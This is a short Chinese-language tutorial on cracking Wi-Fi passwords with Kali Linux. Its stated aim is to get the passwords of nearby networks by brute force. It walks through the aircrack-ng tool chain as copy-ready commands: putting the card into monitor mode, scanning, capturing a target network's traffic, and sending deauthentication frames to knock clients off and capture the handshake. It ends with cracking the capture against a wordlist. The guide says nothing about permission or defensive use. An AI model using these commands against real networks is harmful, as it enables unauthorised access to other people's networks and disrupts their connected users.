### Kali 渗透WIFI

## 主要功能

* **获取可见网络内的wifi密码**： 暴力破解

安装Kali Linux 准备网卡，如果是虚拟机安装则需要额外的USB无线网卡挂载到虚拟机

#### 查看网卡信息
~~~
airmon-ng
~~~

#### 监听网卡	
~~~
airmon-ng start wlan0
~~~

#### 扫描wifi信号
~~~
airodump-ng wlan0
~~~

#### 找出要监听的热点名称，获取ssid地址与channel
~~~
airodump-ng -w home -c 1 --bssid 00:0F:32:B0:99:2C wlan0
~~~

#### 出现连接后打开新窗口执行以下命令
~~~
aireplay-ng --deauth 11 -a router_mac -c target_mac wlan0mon
~~~
等命令执行完切回到原来窗口，看frames 如果变为0则按 ctrl +c 强行退出

#### 拷贝出 cap 文件到mac上面执行
~~~
aircrack-ng -w simple.txt home-01.cap
~~~






















